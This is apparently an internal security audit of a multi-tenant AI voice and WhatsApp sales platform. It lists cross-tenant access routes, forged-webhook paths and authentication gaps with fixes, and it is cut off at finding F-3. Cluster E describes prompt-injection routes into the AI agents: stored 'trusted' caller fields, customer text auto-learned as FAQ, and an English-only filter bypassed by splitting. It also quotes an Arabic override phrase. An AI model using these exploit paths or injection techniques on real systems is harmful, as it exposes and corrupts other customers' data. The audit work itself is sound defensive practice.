# Tier 1 — Security & Data Safety Findings

Date: 2026-08-11 · Branch: `feature/enterprise-ai-voice` · Method: 7 parallel evidence-based sweeps + independent verification of the highest-impact claims by the lead reviewer.

**Deferred by agreement:** load/performance testing, concurrency-at-scale.

**Severity key** — P0: exploitable now / data loss / money wrong today. P1: will hurt real users soon. P2: robustness gap. P3: hygiene.

> ## ⚠️ Deployment status correction (owner-confirmed, 2026-08-11)
>
> **The project is not published yet — it is running in trial only.** Severities below were assigned on the assumption of a live public deployment. They are **not** rewritten in place, because every one of them becomes accurate the day the service is published. Read them with this adjustment:
>
> - **Not reachable today, but live the moment you deploy:** everything that requires a public HTTP endpoint — B-1, B-2, B-3, B-5 (the unauthenticated webhook cluster), C-4/A-11 (CORS + Swagger exposure), and the internet-facing half of G-1 (the API-freeze).
> - **Still P0 the moment a second customer exists:** the whole of Cluster A. Cross-tenant access harms nobody while there is one tenant; it is a certainty the day there are two. This is a **launch blocker**, not an incident.
> - **Already true today, in the trial, regardless of deployment** — these are bugs the owner is living with right now, not future risks:
>   - **D-2** — campaigns halt at 1% of their configured budget and silently flip to `PAUSED`.
>   - **D-1** — the voice spending cap in the UI does nothing.
>   - **C-8** — 14 missing permission codes mean the settings, branches, teams, routing, working-hours, SLA, and file pages return 403 for everyone including the owner.
>   - **B-4** — once a support agent answers one escalation by WhatsApp, every later message they send to the business number is forwarded to that customer.
>   - **F-1 / F-2** — a customer saying "stop" in a support thread is never recorded; campaigns may address a malformed number.
>   - **G-1** — reachable from any trial account with `ai.read`, no public endpoint needed.
>   - **I-1** — a crashed API is invisible and never restarts, in trial as in production.
> - **What this buys:** the structural fix (Wave 1) can be done properly and unhurriedly, before there is traffic to migrate or an incident to manage. That is a significantly better position than the one this report was written for.

**Verification key** — ✅ verified personally by the lead reviewer against the source; ◻ reported by a sweep with a cited failure path and a documented refutation attempt, not independently re-checked.

---

## 0. The one-paragraph verdict

The product's *business* controls are genuinely well built — the 5% discount ceiling holds on every path that was attacked, the voice tool-authorization engine could not be broken, campaign send-claiming is atomic and honest, the Twilio webhook is correctly signed, and the SSRF fetcher survived every encoding trick thrown at it. The *platform* controls underneath them are not. Multi-tenant isolation is not enforced anywhere that matters: the guard designed to enforce it can never fire, and the ORM silently drops the tenant filter instead of failing. The result is that one self-registered free account can read, modify, and destroy every other customer's data, and can send WhatsApp messages from other companies' phone numbers. That single structural defect accounts for roughly half of the P0 findings below.

---

## 1. CONFIRMED IN PHASE 0 (carried forward)

| # | Finding | Evidence | Severity |
|---|---|---|---|
| C-1 | WhatsApp webhook authentication fails open when the secret is unset — and it is unset | `whatsapp/providers/evolution.provider.ts:137-138`; `.env` | P0 ✅ |
| C-2 | `conversations.findOne` fetches by id with no `organizationId` and no `deletedAt` | `conversations/conversations.service.ts:27-29` | P0 ✅ |
| C-3 | Deleted users retain access — `User.deletedAt` never consulted | `common/guards/auth.guard.ts:23-34`; `auth/auth.service.ts:57` | P1 ✅ |
| C-4 | `NODE_ENV=development` in the environment file; not overridden by any deploy config | `.env`; `packages/config/src/index.ts:81-87`; `apps/api/src/main.ts:55-64` | P1 ✅ |

---

## 2. CLUSTER A — Tenant isolation collapse

This is the master defect. Everything in this cluster is one root cause with many exits.

### A-1 `OrganizationGuard` can never fire — no route in the API uses the param name it reads ✅ P0
`common/guards/organization.guard.ts:9-13` resolves the tenant from `request.params.organizationId || body.organizationId || query.organizationId`, and returns `true` when it finds none. A repo-wide search for `:organizationId` across every `*.controller.ts` returns **zero matches** — every org-scoped route uses `:id`. The params branch is therefore dead code on every route in the application.

`PermissionGuard` then runs, finds no `request.membership`, and falls back to `activeMemberships[0]` (`common/guards/permission.guard.ts:29-37`) — the *caller's own* membership. So the permission is evaluated against the attacker's organization while the handler operates on the organization named in the URL.

The comment at `permission.guard.ts:22-28` states outright that "per-resource tenant isolation must be enforced by organizationId scoping in the services themselves." The services do not do this. This is the clearest instance in the codebase of a clean interface over wrong behaviour.

**Concrete, with a free self-registered account** (`POST /v1/auth/register` is public and grants `ORGANIZATION_OWNER`):
- `GET /v1/organizations/<victim>/members` → every member's name, email, role (`organizations.service.ts:22-33`)
- `PATCH /v1/organizations/<victim>` → rewrites another company's legal name, currency, settings (`organizations.service.ts:18-20`)
- `POST /v1/organizations/<victim>/invite` → writes an `Invitation` row into another tenant, and `inviteMember:37` accepts any `isSystem` role including `ORGANIZATION_OWNER` ◻

**Fix:** Rename the param to `:organizationId` across `organizations.controller.ts` (restores the guard on 16 routes in one change), and make the guard **fail closed** — throw when a route needs a tenant and none resolves. **Effort: S** for the rename, **M** for the fail-closed change plus its fallout.

### A-2 `GET /v1/organizations/:id` declares a permission but has no guard to enforce it ✅ P0
`organizations.controller.ts:23-28` carries `@UseGuards(OrganizationGuard)` and `@RequirePermission("organization.read")` — but **not** `PermissionGuard`. `@RequirePermission` is pure `SetMetadata`; with no enforcer in the chain nothing reads it. Effective authorization is "holds any valid JWT."

Returns the full organization row, every membership with `user.{id,name,email,avatarUrl}`, every `channelConnection` (phone number, provider instance id, webhook URL), and every AI agent. This is the only route in the API with declared-but-unenforced permissions.

**Fix:** Add `PermissionGuard` to the chain. Longer term, register `PermissionGuard` as an `APP_GUARD` so `@RequirePermission` can never again be declared without an enforcer. **Effort: S**

### A-3 Omitting `?organizationId` disables the tenant filter platform-wide ✅ P0
Controllers take `@Query("organizationId") organizationId: string`. Nest does not enforce required-ness on `@Query`. Services build `where: { organizationId, deletedAt: null }`. Prisma treats `undefined` in a `where` as *"condition not provided"* and drops it. `prisma/schema.prisma:1-3` declares no `previewFeatures`, so `strictUndefinedChecks` is off and there is no backstop.

`PermissionGuard` does not object — with no org id present it takes the `activeMemberships[0]` branch and validates against the caller's own role, which they legitimately hold.

Verified directly:
- `contacts.service.ts:54-58` — `exportContacts` has **no `take`**. `GET /v1/contacts/export` with the parameter omitted returns a CSV of **every contact row in the database**.
- `conversations.service.ts:11-24` — `findAll` has **no `take` and no `skip`** at all, plus six relation includes.

Same shape on `/v1/conversations`, `/v1/conversations/export`, `/v1/messages/search`, `/v1/audit`, `/v1/whatsapp/connections`, `/v1/knowledge/bases`, `/v1/analytics/*`, `/v1/voice/calls`, `/v1/marketing/leads`. ◻ for the routes not individually re-checked.

**Fix:** Stop accepting `organizationId` from clients. Resolve it from `request.membership` via a `@CurrentOrganization()` decorator. Enable `strictUndefinedChecks` so a future `undefined` throws instead of widening. **Effort: M**

### A-4 Guards cannot read multipart bodies, so file-upload routes take tenancy from the client ◻ P0
Nest's order is guards → interceptors → pipes. `FileInterceptor` (multer) is what parses `multipart/form-data`, and it runs *after* the guards. When `PermissionGuard:31` reads `request.body?.organizationId` on a multipart request, the body is still `{}`. The guard always takes the `activeMemberships[0]` branch; the handler then receives the fully-parsed body and uses the client's `organizationId`.

Affected: `POST /v1/messages/media`, `POST /v1/files/upload`, `POST /v1/marketing/leads/import/preview`. On the first, `messages.service.ts:106-155` creates a `MediaAsset` owned by the victim org and a `Message` inside the victim's conversation attributed to an arbitrary `senderMembershipId` — a forged message appearing in another company's inbox as if sent by their own agent.

Note the contrast: the non-multipart siblings (`/messages/template`, `/leads/import/commit`) *are* checked by the guard. The defect is specific to multipart.

**Fix:** Never read tenancy from a multipart body. **Effort: S**

### A-5 Cross-tenant WhatsApp send — real messages from another company's number ✅ P0
`messages.service.ts:38-40`:
```ts
async sendMessage(dto: { conversationId; text; organizationId; membershipId }) {
  const conversation = await prisma.conversation.findUnique({
    where: { id: dto.conversationId }, include: { contact: true, connection: true } });
```
No organization predicate. The method then reads `conversation.connection.providerInstanceId` and `conversation.contact.normalizedPhone` and calls `evolutionProvider.sendText` — a live send through the *victim's* WhatsApp instance to the *victim's* customer. The `Message` row is stamped with the attacker's `organizationId`, so the victim has no record of it.

The controller comment at `messages.controller.ts:36-37` claims tenant isolation because `organizationId`/`membershipId` come from the authenticated membership. That is true and irrelevant — the tenant boundary here is `conversationId`, which is unvalidated.

Same omission in `sendTemplateMessage:162`, `sendMediaMessage:99`, `retryMessage:208`. Requires only `conversations.reply`, the lowest support role.

**Fix:** `findFirst({ where: { id, organizationId: membership.organizationId } })` in all four. **Effort: S**

### A-6 Read/modify/destroy any tenant's records by id ◻ P0
Services that key on the primary key alone, with a complete route table in `scratchpad/tier1-tenancy.md`. Highlights:

| Surface | What an attacker gets | Location |
|---|---|---|
| `GET /v1/messages?conversationId=` | 50 message bodies per page, cursor-paginated backwards through any thread. **No `organizationId` anywhere on the route.** The cleanest exfiltration primitive in the codebase. | `messages.service.ts:14-23` |
| 18 × `conversations/:id/*` | read (incl. **internal staff notes**), update, assign, resolve, close, snooze, reopen, block, tag, watch, merge — on any tenant's live customer thread, with the state change pushed into the victim's own websocket room | `conversations.service.ts:27-166` |
| 17 × `ai-agents/:id/*` | `POST /:id/test` runs the victim's agent over the victim's knowledge base and returns the answer — an unlimited read oracle. `PATCH /:id` + `/publish` rewrites the system instructions and support phone number of another company's live customer-facing bot. `GET /:id/tools` returns `AgentTool.configuration`. | `ai-agents.service.ts:15-274` |
| `knowledge/*` | Upload a document into another tenant's knowledge base — after ingestion their AI repeats attacker-authored content to their real customers. `DELETE /documents/:id` is a **hard delete** with no soft-delete fallback. | `knowledge.service.ts:13-182` |
| `POST /v1/contacts/:id/merge` | Re-points another tenant's conversations and messages onto an attacker-owned contact, then soft-deletes theirs. `getTimeline` filters by `contactId` only, so the stolen history is then readable inside the attacker's own tenant. Exfiltration **and** destruction. | `contacts.service.ts:93-119` |
| `DELETE /v1/messages/:id`, `DELETE /v1/files/:id`, `POST /v1/organizations/:id/working-hours` | Hide any message; hard-delete any media asset; `deleteMany` wipes another org's entire working-hours configuration | `messages.service.ts:229`, `files.service.ts:36`, `organizations.service.ts:158-175` |
| `PATCH /v1/organizations/:id/roles/:roleId` | Guarded by `role.organizationId !== organizationId` — but `organizationId` is the attacker-supplied `:id`, so the check passes. Strips every permission from a victim role, locking its holders out of their own inbox. | `organizations.service.ts:89-104` |

**Fix:** Every service method that takes a resource id must accept and filter on `organizationId`; convert writes to `updateMany`/`deleteMany` so a mismatch is a 0-row no-op rather than a successful cross-tenant write. **Effort: M**

### A-7 `/v1/notifications` has no authorization beyond "holds a token" ◻ P0
`notifications.controller.ts:7-15` carries class-level `AuthGuard` and nothing else — no `PermissionGuard`, no `@RequirePermission`, no `OrganizationGuard`. Both `userId` and `organizationId` come from the query string and are used as the only filter. `markAsRead` filters on the notification id alone.

`GET /v1/notifications?userId=<victim>` returns their 50 newest notifications — hot-lead alerts, support escalations, SLA breaches. `POST /read-all` suppresses a victim's operational alerts. User ids come free from A-2. This is the only module in the API with zero authorization.

**Fix:** Drop both query parameters; derive from the JWT and the resolved membership. **Effort: S**

### A-8 Marketing and voice single-resource routes inherit A-3 ◻ P1
These services are the best-scoped code in the repo — `findFirst({ where: { id, organizationId } })` throughout. But the org id arrives as an optional query parameter, so the `undefined` collapse applies to *writes* too: `PATCH /v1/marketing/products/<victim-product>` rewrites the row the code documents as "the ONLY price authority for the AI sales layer"; `DELETE /v1/marketing/dnc/<id>` removes another tenant's do-not-contact entry (a compliance control); `GET /v1/voice/calls/<id>` returns another tenant's call transcripts.

Fixing A-3 fixes this cluster with no changes to these services at all.

### A-9 `updateLeadInterest.productId` is model-controlled text written to an unconstrained column ◻ P2
`voice/tools/voice-tool-executor.service.ts:240-242` writes `String(args.productId)` into `Call.productId`, which `prisma/schema.prisma:2151` declares as a bare `String?` with **no relation and no foreign key**. Three later reads are unscoped `findUnique` calls, one of which formats the resulting price into a WhatsApp alert to the org owner. Exploitation requires knowing another tenant's product cuid, which is not enumerable — so this is a real scoping defect with a hard precondition, not a turnkey exploit. The unconditional part is that arbitrary model output lands in a column the platform treats as an id.

---

## 3. CLUSTER B — The unauthenticated webhook

### B-1 Signature check fails open, and the secret is absent from every place an operator would look ✅ P0
`evolution.provider.ts:138`: `if (!config.EVOLUTION_WEBHOOK_SECRET) return true;`. The variable is `z.string().optional()` with no boot-time enforcement, and it appears in **none** of `apps/api/.env.production`, `DEPLOYMENT.md`, `docs/DEPLOYMENT.md`, or the working `.env`. Its only appearance is `.env.example:39`, whose text frames it as conditional. Every path an operator follows leaves it unset.

Contrast `twilio-voice.provider.ts:134-135`, which does `if (!authToken) return null` — fails **closed**. The Evolution path is the odd one out, which is what makes this a defect rather than a design choice.

**Fix:** Return `false` when the secret is missing; make the schema require it whenever `EVOLUTION_API_URL` is set; document it. **Effort: S**

### B-2 One event type bypasses the signature check entirely, then writes across all tenants ✅ P0
`webhooks/webhooks.service.ts:24-30`:
```ts
const event = await this.evolutionProvider.validateWebhook(payload, headers, query);
if (!event) {
  if (payload?.event === "messages.update" && payload?.data?.key?.id) {
    await this.handleMessageUpdate(payload.data);
    return { received: true, processed: true };
  }
```
`validateWebhook` returns `null` specifically on signature failure — and the caller treats that identically to "unparseable payload," falling into a branch that processes the request anyway. `handleMessageUpdate:490` then runs `prisma.message.updateMany({ where: { providerMessageId: messageId } })` with **no organization scope**, writing an attacker-supplied string into `providerErrorMessage`.

This survives even for an operator who correctly sets the secret. Practical exploitability is limited because the attacker must know a `providerMessageId`, but the authentication bypass is unconditional.

**Fix:** Move signature validation into a guard on the controller so no branch can bypass it; scope the `updateMany` by an organization resolved from a validated instance id. **Effort: S**

### B-3 Forged webhooks make the system send real WhatsApp messages to attacker-chosen numbers ◻ P0
The destination is taken verbatim from the payload: `extractPhoneNumber` reads `data.key.remoteJid` (`evolution.provider.ts:123-135`), `handleIncomingMessage` **creates a Contact from it** (`:100-103`), creates a conversation in `mode:"AI_AUTOMATIC"`, and fires an AI reply to those digits. Each forged POST yields one unsolicited WhatsApp message from the client's real number plus one LLM call billed to the client. The only brake is the global 1000 req/15 min per IP.

Genuine precondition: knowing `providerInstanceId`, which equals `connection.id` — a resource identifier, not a secret. The sweep confirmed it does **not** leak through `GET /v1/whatsapp/connections` (that route 403s correctly on a foreign org).

### B-4 Any inbound message from the support number is relayed verbatim to a customer, forever ◻ P0
`webhooks.service.ts:396-475`. `handleSupportReply` runs first; any inbound whose sender normalizes to the agent's `supportPhoneNumber` has its text sent verbatim to a customer and written into the org's FAQ. Two defects:
1. **Unauthenticated** — via a forged webhook, anyone knowing the org's published support number injects arbitrary text into a live customer conversation and poisons the FAQ that future AI replies cite.
2. **The pending flag is never cleared.** `markPendingSupportEscalation` writes `metadata.pendingSupportEscalation` and nothing anywhere clears it. So after a staffer answers one escalation, *every* subsequent message they send to the business number is forwarded to that customer. With two pending escalations, the matcher takes the most recently updated — so the answer meant for customer X lands on customer Y.

### B-5 Log forgery on the unauthenticated route ◻ P2
`webhooks.service.ts:36` interpolates `payload?.event` into a log line before validation runs. Embedded newlines produce lines indistinguishable from genuine records. Also a cheap unauthenticated log-volume amplifier at 50 MB per request.

---

## 4. CLUSTER C — Authentication, sessions, roles

### C-5 Two-factor authentication is never enforced at login ◻ P1
`auth.service.ts:56-85` compares the password and immediately returns a 7-day token. There is no branch on `user.twoFactorEnabled`, no TOTP challenge, no step-up token. A repo-wide search finds writers of the flag but no reader. `setup2Fa:208-223` returns the secret and creates the credential row *before* any verification, and `disable2Fa` requires nothing but a valid session. A tenant owner who enables TOTP and believes their account is protected is wrong.

### C-6 No token revocation on logout, password change, password reset, or member removal ◻ P1
`logout(userId)` is literally `return { success: true }`. Password change and reset write a new hash and stop. `AuthGuard` validates only signature, expiry, and `status === "ACTIVE"` — no `jti`, no token version, no session lookup. The `Session` table exists with **zero** runtime usage. Tokens live 7 days and `POST /v1/auth/refresh` mints a fresh 7-day token from a stolen one, so the window is effectively unbounded. The token lives in `localStorage`.

### C-7 No login throttle, no lockout, and one shared rate-limit bucket ✅(config) ◻(impact) P1
The only rate limiting is `rateLimit({ windowMs: 15min, max: 1000 })` applied globally in `main.ts:19-26`. `/auth/login` has no dedicated limiter, no failed-attempt counter, no lockout, and no failed-login audit row. The registration password minimum is 6 characters.

Separately, `app.set('trust proxy', …)` appears nowhere in the repo and `gateway.js` proxies without `xfwd`, so `req.ip` is `::ffff:127.0.0.1` for **every** request. The limiter therefore has a single bucket for the whole platform: one client sending 1000 requests 429s every user of every tenant for the rest of the window.

### C-8 14 permission codes are referenced but never created — those routes are permanently 403 ✅ P1
I read the seed's permission list directly. Missing: `settings.read`, `settings.update`, `members.update`, `members.remove`, `roles.read`, `roles.manage`, `branch.read`, `branch.create`, `team.read`, `team.create`, `routing.read`, `routing.create`, `sla.read`, `sla.create`.

Consequence: **nobody on the platform — including the owner — can** manage member roles, create roles, manage branches, teams, routing rules, working hours, holidays, SLA policies, or upload/download a file. The entire org-settings surface is dead. Conversely `settings.manage` is seeded and referenced by no route.

Three seeded roles receive **zero** permission grants: `ORGANIZATION_ADMIN`, `ANALYST`, `READ_ONLY`. An invited admin can log in and do nothing.

The role/permission catalogue exists in three copies: `packages/permissions/src/index.ts` (rich, **unused at runtime**), `packages/database/src/seed.ts` (the real authority), and `packages/shared/src/constants.ts:16` (no consumer).

### C-9 Platform-owner escalation — LATENT, not live ✅ (conflict between sweeps, resolved)
Three sweeps reported this; two called it exploitable today. It is not. `platform.service.ts:8-13` authorizes on a **role-name string comparison** (`role.name === "PLATFORM_SUPER_ADMIN"`), with no `isSystem` or `organizationId === null` qualifier. `listRoles` hands out system role ids. `updateMemberRole:54-59` writes `dto.roleId` with **no validation** — unlike `inviteMember:37`, which does check. `createRole:73` accepts an arbitrary `name` with no reserved-name list.

Both exploit routes require `members.update` or `roles.manage` — **neither of which is seeded** (C-8). One sweep concluded it was live by reading `packages/permissions`, which is not the runtime authority. I verified the seed directly: the path is blocked today.

**This matters for sequencing:** fixing C-8 (required to make the settings UI work at all) opens this escalation. The two fixes must ship together.

### C-10 Account enumeration ◻ P2
`forgotPassword` returns two structurally different bodies — `{success:true}` when the user does not exist, `{success:true, message:"..."}` when it does (`auth.service.ts:115` vs `:128`). The generic wording is defeated by the shape of the response. `register` returns 409 vs 201. `login` returns before `bcrypt.compare` when the user is missing, giving a timing oracle too.

### C-11 Password reset is undeliverable; email is never verified ◻ P2
`forgotPassword` creates a `Verification` row with a 24-hour token and never sends it — **there is no mail transport in the repo**, despite `SMTP_*` in the config schema. So `/auth/reset-password` is dead in practice. Nothing anywhere creates an `EMAIL_VERIFICATION` row, so `/auth/verify-email` can never succeed — and does not need to, because `register` sets `emailVerifiedAt` unconditionally. Anyone can register accounts against email addresses they do not control, marked verified.

### C-12 Realtime: token in the query string, and `typing` relays without a membership check ◻ P2
`apps/realtime/src/main.ts:32` accepts `handshake.query.token`; the polling transport puts it in the request URL, so a 7-day bearer token lands in access logs. `:106-111` emits into `conv:${data.conversationId}` taken straight from the client with no check that the socket ever joined. `join-conversation:83-97` **is** correctly scoped — the gap is specifically the `typing` handler. `:51-55` reads `decoded.organizationId`, but `generateToken` signs only `{sub, email}`, so multi-org users are silently pinned to their first organization.

### C-13 `request.user` carries `passwordHash` ◻ P2
`auth.guard.ts:23-36` assigns the raw Prisma row to `request.user` with no `select`. Two sweeps independently traced every `@CurrentUser()` consumer and confirmed none currently returns it — which is why this is P2. It is one careless `return user;` away from disclosing every caller's bcrypt hash, and `/auth/me` looks like it does exactly that.

### C-14 Plaintext secrets at rest ◻ P2
TOTP seeds and backup codes (`TwoFactorCredential`), OAuth access/refresh tokens (`Account`), outbound webhook secrets, and WhatsApp session blobs are all stored in cleartext. `ProviderCredential.encryptedData` is the only field whose name implies encryption. `setup2Fa` also persists the credential before verification, so repeated setup calls leave a growing pile of valid unverified seeds.

### C-15 No server-side route protection in the web app ◻ P3
No `middleware.ts` anywhere; every `/app/*` page is client-gated only. Both sweeps confirmed the API is the real boundary — all 24 pages are `"use client"` and no privileged data is embedded during SSR — so this is defence-in-depth and UX, not disclosure.

---

## 5. CLUSTER D — Money and cost control

### D-1 The voice spending circuit breaker can never trip ✅ P1
`packages/config/src/index.ts:67-68` defaults both `VOICE_TELEPHONY_COST_PER_MINUTE_MINOR` and `VOICE_AI_COST_PER_MINUTE_MINOR` to **0**. `voice-usage.service.ts:33-34` multiplies minutes by those rates, so every usage record is 0. `spendSince:113` sums `actualCostMinor ?? estimatedCostMinor` — and I grepped every reference to `actualCostMinor` in the codebase: **four reads, zero writes**. `record()`'s optional fourth parameter is never passed.

So `spent` is always 0 and `isOverBudget` always returns `{blocked:false}`. A tenant who sets a 200 SAR daily cap in the UI has no cap. `.env.example:84-85` documents both variables as literal `0`, so an operator following the example gets the inert state by construction. Neither variable appears in `.env.production` or the deployment docs.

Secondary: `VoiceUsageRecord` is written only in `finalizeCall`, so in-flight spend is invisible to the breaker — the budget can be overshot by `maxConcurrentCalls` full calls even after the rate fix.

### D-2 Campaign AI budget is wrong by exactly 100× ✅ P1
`marketing/campaigns/campaign-dispatch.service.ts:218`:
```ts
return Math.round(usd * 375 * 100); // USD → SAR halalas, approx 3.75 SAR/USD
```
1 USD = 3.75 SAR = **375 halalas**. `usd * 375` is already correct; the extra `* 100` inflates it to 375 SAR per dollar. The comparison target `dailyAiBudgetMinor` is an `Int` in halalas, so the two sides disagree by 100×.

Effect: a campaign halts at **1%** of its configured budget and flips itself from `RUNNING` to `PAUSED` with only a `logger.warn` — no audit entry, no user-facing reason. Safe direction for money, but it breaks the product silently. The float accumulation in the same function was checked and is fine.

### D-3 The AI sales reply path has no throttle, no cap, and no budget check ◻ P1
`sales-conversation.service.ts:47-163` has no rate limiter, no per-conversation action cap, and never consults `isOverBudget` (that is checked only inside `prepareBatch`). Every inbound message runs 2–4 OpenAI calls including a ~12 KB-context summary once history grows. A lead replying «؟» in a loop drives unbounded spend; the campaign-level guards no longer apply because the recipient was flipped to `REPLIED` on the first message.

Compounding: `checkRateLimit` returns `true` unconditionally when `REDIS_DISABLED` (`packages/ai/src/safety.ts:97-99`) — which recent commits make a supported deployment mode — disabling the only per-org AI throttle. And `checkActionLimits` counts `AiRun` rows, but rows are written only for `REPLY` and `HANDOFF`, so `ASK_CLARIFICATION` / `NO_REPLY` / `CALL_TOOL` never advance the counter.

### D-4 No completion-token ceiling and no request timeout on any chat call ◻ P2
`packages/ai/src/chat.ts:38-45` passes no `max_tokens`, no `timeout`, and no `maxRetries` override — so the SDK's default 2 retries multiplies with `structuredCall`'s own `maxAttempts: 2`, making one logical turn up to 4 billed requests. The realtime session omits `max_response_output_tokens` (defaults to infinite). `assembleContext` returns an unbounded string into the system prompt.

### D-5 Stuck calls permanently block all future calls ◻ P2
`concurrentCallCount` counts `Call` rows whose status is not terminal. If the API dies mid-call, those rows stay `ACTIVE` forever and there is no sweeper anywhere in the repo. After a restart with 5 live calls, `concurrent >= maxConcurrentCalls` is permanently true and **every future inbound call is rejected** with "all lines are busy" until someone edits the database by hand.

### D-6 `AiRun.costUsd` is written on every support and sales turn and read by nothing ◻ P3
Grepped: every hit is a write or a type declaration. The two highest-volume AI paths have their spend recorded and then ignored. (`AiRun.costUsd` is also the only `Float` money column in a schema that is otherwise integer minor units — but with no aggregator there is no rounding bug to report today.)

---

## 6. CLUSTER E — AI prompt injection and tool abuse

**What held up under attack** (recorded because it matters): the 5% discount ceiling is enforced on every live path — clamped in Zod, on product create, on update, at all three prompt-build sites, and finally in `computeDiscountMath`, which is the only writer of `DiscountOffer`. `authorizeToolCall` really is the only gate; unknown keys are stripped *before* the executor sees them; prototype pollution is neutralized; and tenancy genuinely comes from the server-side `Call` record — no tool declares a tenant identifier. The sweep tried to break both and could not.

**What did not hold up:** the claim that prompt injection and price hallucination are blocked. The delimiting covers only the live customer turn. Every slot read back out of the database is concatenated raw into a system prompt.

### E-1 Caller-planted text is persisted by a tool and replayed as "trusted information from our system" ✅(prompt) ◻(chain) P1
`packages/ai/src/voice/prompts.ts:136-142` — verified verbatim:
```
lines.push("## سياق العميل (معلومات موثوقة من نظامنا)");
if (caller.contactName)  lines.push(`- الاسم: ${caller.contactName}`);
if (caller.businessName) lines.push(`- المنشأة: ${caller.businessName}`);
```
Raw interpolation, under a heading that literally declares the content trusted, outside any untrusted-data wrapper.

Those two fields are writable by the caller. `captureDetails` is `NO_VERIFICATION`, allowed for all roles, and its string arguments are capped only at 2000 characters. The executor writes them straight to `Contact.name` / `Contact.company` / `Lead.businessName` with no sanitization. The same `Lead.businessName` is concatenated raw into the **WhatsApp** sales system prompt at `marketing/prompts.ts:142`, positioned *after* the discount rule.

So: a caller dictates a paragraph as their "business name" on call one; on call two — and on every subsequent WhatsApp message — the model reads it as authoritative system context. The discount *number* is still clamped. What the model *says* is not.

Note the test gap: `voice-prompt-guards.spec.ts` builds `caller: { isKnownCustomer: false }`, so this entire block is never exercised by any test.

### E-2 Customer-authored text becomes an active, org-wide FAQ inside the support system prompt ◻ P1
On handoff, the customer's raw message is stored as `pendingSupportEscalation.question`. When any agent replies — by WhatsApp *or simply in the inbox* — `learnFromSupportReply` creates a `FaqEntry` with `question` = that customer text and `isActive: true`. No review queue, no moderation, no length cap; the only gate is `agent.autoLearningEnabled`.

`getFaqContext` then matches by `contains: query` on question **or** answer, and `agent.ts:109-110` concatenates the result into the system prompt — with no delimiter and no untrusted note. It is the one prompt in the repo that omits both. Correctly org-scoped, so this is intra-tenant, which is what keeps it P1.

### E-3 The price/discount output guard misses Arabic-Indic digits ✅ P1
`packages/ai/src/marketing/sales-agent.ts:128-136` — verified verbatim. `/خصم\s*\d|discount/i` and `/(\d[\d,،.]*)\s*(?:ريال|ر\.س|SAR)/g`. JavaScript `\d` is `[0-9]` only; it does not match `٠١٢٣٤٥٦٧٨٩`. And the amount branch requires a trailing currency word, so any bare number is invisible.

«تمام، أقدر أعطيك خصم ٥٠٪ — يصير السعر ١٢٥٠ بدل ٢٥٠٠» passes every check and is sent verbatim over WhatsApp. So does «السعر النهائي لك 1200 فقط». There is no test for this function anywhere.

### E-4 The voice channel has no output guard at all ◻ P1
`call-orchestrator.service.ts:280-285` forwards realtime audio deltas to the caller the instant they arrive. `assistant_transcript` is only *recorded*, and arrives after the audio was already spoken. Nothing compares what was said to `product.priceMinor`. `evaluation/scenarios.ts:54` claims `enforcedByBackend: "price comes only from SalesProduct.priceMinor"` — true of what is *stored*, false of what the caller *hears*. A verbal quote from a branded company line is a commitment the tenant will be held to.

### E-5 The injection filter is English-only and is bypassed by splitting across two messages ◻ P1
`packages/ai/src/safety.ts:10-30` is six lowercase English substrings on an entirely Arabic platform — «تجاهل كل التعليمات السابقة» matches nothing. Worse, the check runs on the current message only: `agent.ts:86-95` loads the last 10 `Message` rows and maps them into the payload **raw** — no injection check, no masking, no delimiter, no length cap. The inbound message is persisted *before* the AI runs, so a message that trips the filter is still stored and still replayed on the next turn. The filter is a one-turn delay, not a barrier.

### E-6 Tenant persona fields override platform rules ◻ P2
`greetingMessage` (500 chars), `closingMessage`, `tone`, `formality`, `employeeName` are only `.slice()`d, never escaped, and `prompts.ts:172` emits the greeting as the **last** substantive line of the system prompt — after every price and discount rule, inside a quote the tenant can simply close. The 5% ceiling is presented as a *platform* rule; a tenant string with recency advantage can contest it. Combined with E-4 (no voice output guard), the tenant's own customers hear whatever the persona instructs. Privilege escalation by prompt.

The rest of `sanitize()` is well done — `allowedTools` genuinely cannot be poisoned, and the agent's `verificationLevel` does not weaken the tool registry's.

### E-7 Model free text goes out over WhatsApp with no URL filter ◻ P2
`voice-tool-executor.service.ts:373-379`. The product URL is correctly restricted to org-scoped product columns — that part is solid. But `note` is undeclared-format free text prepended verbatim to the outbound message, with no URL check, even though `containsUntrustedUrl` exists in the marketing package. The recipient is server-derived (good), so the damage is the tenant's verified number originating an attacker-chosen link.

### E-8 Campaign first-contact messages have no URL guard ◻ P2
`personalization.ts:93-107` checks length, discount talk, and price — but not URLs, unlike `processSalesTurn`. The untrusted slot is a summary of the *lead's own website*. Text planted on that site can surface a URL into the outgoing message. `POST /campaigns/:id/start` dispatches immediately; `preview` and `dry-run` exist but are not on the required path.

### E-9 The untrusted-data delimiter is not escaped ◻ P2
Customer text and fetched website content are wrapped in `<بيانات_غير_موثوقة>` but not escaped, so content containing the literal closing tag terminates the region. Held at P2 because the output-side money guards do hold for the price case — but see E-3 for the hole in those guards.

---

## 7. CLUSTER F — Outbound message safety

### F-1 DNC and opt-out are enforced on exactly one send path ◻ P1
`isBlocked` is a correct, correctly-keyed gate called from `marketing-send.service.ts:54` and nowhere else. Nothing else in the codebase queries `DncEntry`. `detectOptOutIntent` runs only from `SalesConversationService.handleInbound`, reached only when the conversation carries a `salesContext`.

So a customer who says «توقف» / "STOP" **in a support thread** is never added to DNC, never marked opted-out, and is answered by the support AI as if it were an ordinary question. Weeks later the same person is eligible for a campaign, and the dry-run report — which reads the same empty table — shows nothing wrong.

**The hypothesis I asked the sweep to test was refuted:** `normalizePhoneStrict` is idempotent across all Saudi forms, and writer and reader converge on the same key. The DNC key is not mismatched; the *coverage* is.

### F-2 The two phone normalizers disagree, and campaigns send to the wrong string ◻ P1
`normalizePhone("0501234567")` returns `"501234567"` — strips the leading zero, never adds a country code. For a lead imported in ordinary Saudi format, `MarketingSendService` resolves the Contact on that key and sends `phoneNumber: contact.normalizedPhone` — handing the provider a 9-digit string with no country code. Best case it fails; worst case it resolves to an unrelated subscriber who receives the client's marketing message.

Even where delivery works, the same human messaging back arrives as `966501234567` and creates a **second Contact**, whose conversation has no `salesContext` — so the sales branch is skipped, the recipient is never marked `REPLIED`, and **an opt-out in that reply is never detected.**

### F-3 `broadcast` sends to an arbitrary unbounded list with no DNC and no record ◻ P1
